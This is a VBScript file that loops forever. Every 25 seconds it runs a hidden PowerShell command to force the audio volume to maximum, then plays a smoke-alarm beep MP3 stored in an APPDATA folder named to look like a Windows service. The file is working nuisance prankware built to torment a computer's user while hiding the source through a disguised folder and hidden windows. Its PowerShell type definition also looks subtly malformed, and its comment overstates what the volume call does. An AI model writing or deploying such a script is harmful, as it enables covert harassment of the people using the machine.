Option Explicit

Dim objShell, player
Set objShell = CreateObject("WScript.Shell")

' Create WMP player once and reuse
Set player = CreateObject("WMPlayer.OCX")

' Path to your MP3 (change if needed)
Const mp3Path = "%APPDATA%\WindowsServiceProviderBeep\SmokeBeep.MP3"

Do
    ' --- Step 1: Silently set system master volume to 100% using PowerShell CoreAudio API ---
    objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command " & _
        """Add-Type -TypeDefinition '@using System; using System.Runtime.InteropServices; " & _
        "public class Audio { [DllImport(""winmm.dll"")] public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume); }'; " & _
        "[Audio]::waveOutSetVolume([IntPtr]::Zero, 0xFFFFFFFF)""", 0, True

    ' --- Step 2: Ensure WMP internal volume is full, stop any previous playback, then play ---
    On Error Resume Next
    player.controls.stop
    On Error GoTo 0

    player.settings.volume = 100
    player.URL = mp3Path
    player.controls.play

    ' --- Step 3: Wait 25 seconds before repeating (25000 ms) ---
    WScript.Sleep 25000
Loop
